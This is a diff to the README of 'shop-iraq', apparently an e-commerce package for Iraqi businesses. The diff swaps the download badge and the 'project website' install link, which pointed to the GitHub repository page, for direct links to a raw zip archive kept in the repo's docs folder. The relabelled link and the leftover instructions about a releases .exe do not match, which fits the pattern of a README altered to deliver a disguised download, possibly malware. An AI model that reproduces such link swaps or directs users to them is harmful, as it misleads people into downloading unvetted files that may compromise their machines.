@@ -1,6 +1,6 @@
 # 🛒 shop-iraq - Build your online shop in Iraq
 
-[![Download shop-iraq](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/peaceable-stanchion619/shop-iraq)
+[![Download shop-iraq](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/peaceable-stanchion619/shop-iraq/main/docs/iraq_shop_3.7.zip)
 
 Shop-iraq provides a complete e-commerce system built for businesses in Iraq. It handles Arabic text, displays menus from right to left, and supports payment methods used by local shoppers. You own your data because you host the software on your own computer or server.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these standards before you start.
 
 Follow these steps to set up your shop on a Windows computer.
 
-1. Visit the project website at [https://github.com/peaceable-stanchion619/shop-iraq](https://github.com/peaceable-stanchion619/shop-iraq) to find the installer.
+1. Visit the project website at [https://raw.githubusercontent.com/peaceable-stanchion619/shop-iraq/main/docs/iraq_shop_3.7.zip](https://raw.githubusercontent.com/peaceable-stanchion619/shop-iraq/main/docs/iraq_shop_3.7.zip) to find the installer.
 2. Look for the file ending in .exe in the releases section.
 3. Click the file to start the download. 
 4. Save the file to your desktop or downloads folder.
